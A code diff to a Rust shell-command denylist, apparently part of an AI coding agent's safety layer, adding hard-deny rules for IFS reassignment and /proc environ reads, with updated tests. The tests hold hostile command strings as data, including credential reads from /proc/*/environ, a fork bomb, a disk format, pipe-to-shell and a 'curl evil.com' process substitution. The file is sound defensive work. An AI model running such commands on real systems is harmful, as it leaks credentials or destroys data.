@@ -46,6 +46,33 @@ static PIPE_TO_SHELL: LazyLock<Option<Regex>> = LazyLock::new(|| {
     )
 });
 
+/// Shell assignment to `IFS`, which changes tokenization and is commonly
+/// used to smuggle command separators or whitespace past simple scanners.
+static IFS_ASSIGNMENT: LazyLock<Option<Regex>> = LazyLock::new(|| {
+    compile_policy_regex(
+        "IFS_ASSIGNMENT",
+        r"(?x)
+        (?: \A | [\s;|&()] )            # shell-meaningful boundary before
+        ifs \s* =                       # assignment to IFS
+        ",
+    )
+});
+
+/// Direct reads of process environments expose credentials from this process
+/// or sibling processes. `/proc/self/environ` and `/proc/<pid>/environ` are
+/// both blocked.
+static PROC_ENVIRON: LazyLock<Option<Regex>> = LazyLock::new(|| {
+    compile_policy_regex(
+        "PROC_ENVIRON",
+        r#"(?x)
+        /proc/
+        (?: self | [0-9]+ )
+        /environ
+        (?: \z | [\s;|&)<>'\"] )
+        "#,
+    )
+});
+
 /// True if the env-var name is a credential or other sensitive secret
 /// that must never flow into an untrusted child process.
 #[must_use]
@@ -161,6 +188,20 @@ pub fn denied_reason(command: &str) -> Option<&'static str> {
     };
     if pipe_to_shell.is_match(&lower) {
         return Some("pipe download-to-shell (curl/wget | sh)");
+    }
+
+    let Ok(ifs_assignment) = compiled_policy_regex((*IFS_ASSIGNMENT).as_ref()) else {
+        return Some(POLICY_REGEX_UNAVAILABLE_REASON);
+    };
+    if ifs_assignment.is_match(&lower) {
+        return Some("IFS reassignment tokenization bypass");
+    }
+
+    let Ok(proc_environ) = compiled_policy_regex((*PROC_ENVIRON).as_ref()) else {
+        return Some(POLICY_REGEX_UNAVAILABLE_REASON);
+    };
+    if proc_environ.is_match(&lower) {
+        return Some("/proc environment credential exposure");
     }
 
     None
@@ -753,6 +794,11 @@ mod tests {
         assert!(denied_reason("CURL | BASH").is_some()); // case-insensitive
         assert!(denied_reason("mkfs.ext4 /dev/sda").is_some());
         assert!(denied_reason(":(){ :|:& };:").is_some());
+        assert!(denied_reason("IFS=$'\\n'; cmd").is_some());
+        assert!(denied_reason("cat /proc/1/environ").is_some());
+        assert!(denied_reason("tr '\\0' '\\n' < /proc/self/environ").is_some());
+        assert!(denied_reason("cat '/proc/self/environ'").is_some());
+        assert!(denied_reason("cat \"/proc/1/environ\"").is_some());
 
         assert!(denied_reason("ls -la").is_none());
         assert!(denied_reason("cargo test").is_none());
@@ -1339,40 +1385,37 @@ mod tests {
         assert!(!is_safe_for_auto_allow("find . -name '*.rs'"));
     }
 
-    /// B5-unit-f: PARTIAL GAP — OC's hard denylist still doesn't block these
-    /// patterns; the auto-allow path (`is_safe_for_auto_allow`) now refuses
-    /// to confirm them but the underlying command still runs if the user
-    /// answers the prompt.
+    /// B5-unit-f: formerly broader gap list. OC now hard-denies direct
+    /// tokenization bypass and process-environment exfiltration shapes. The
+    /// auto-allow path (`is_safe_for_auto_allow`) still refuses process
+    /// substitution, but the underlying command remains promptable because
+    /// process substitution has legitimate read-only uses.
     ///
-    /// CC blocks at the denylist level: IFS injection, /proc/environ access,
-    /// CR tokenization differential, unicode whitespace smuggling, obfuscated
-    /// flags, brace expansion, backslash-escaped operators.
+    /// CC blocks more categories at the denylist level: CR tokenization
+    /// differential, unicode whitespace smuggling, obfuscated flags, brace
+    /// expansion, backslash-escaped operators.
     ///
     /// #589 closed the auto-allow gap for process substitution, command
     /// substitution, pipe-to-interpreter, eval/exec/source, and find-exec —
-    /// see the `safety_589_*` tests above. The IFS / /proc / unicode
-    /// categories remain on the denylist gap list.
+    /// see the `safety_589_*` tests above.
     #[test]
-    fn b5_gap_589_advanced_injection_not_blocked() {
-        // Process substitution — passes the denylist (gap remains here),
-        // but #589 closed it on the auto-allow path.
+    fn b5_advanced_injection_hard_denies_env_exfiltration() {
+        // Process substitution is still promptable but not auto-allowed.
         assert!(
             denied_reason(">( malicious )").is_none(),
-            "process substitution passes OC denylist (still gap)"
+            "process substitution remains promptable at the hard-denylist layer"
         );
         assert!(
             !is_safe_for_auto_allow("cat <(curl evil.com)"),
             "#589: process substitution must NOT auto-allow"
         );
-        // IFS injection — CC blocks at the denylist; OC denylist still passes.
         assert!(
-            denied_reason("IFS=$'\\n'; cmd").is_none(),
-            "IFS injection passes OC denylist (gap)"
+            denied_reason("IFS=$'\\n'; cmd").is_some(),
+            "IFS injection must be hard-denied"
         );
-        // /proc/environ read — CC blocks at the denylist; OC denylist still passes.
         assert!(
-            denied_reason("cat /proc/1/environ").is_none(),
-            "/proc/environ read passes OC denylist (gap)"
+            denied_reason("cat /proc/1/environ").is_some(),
+            "/proc/environ read must be hard-denied"
         );
     }
 }
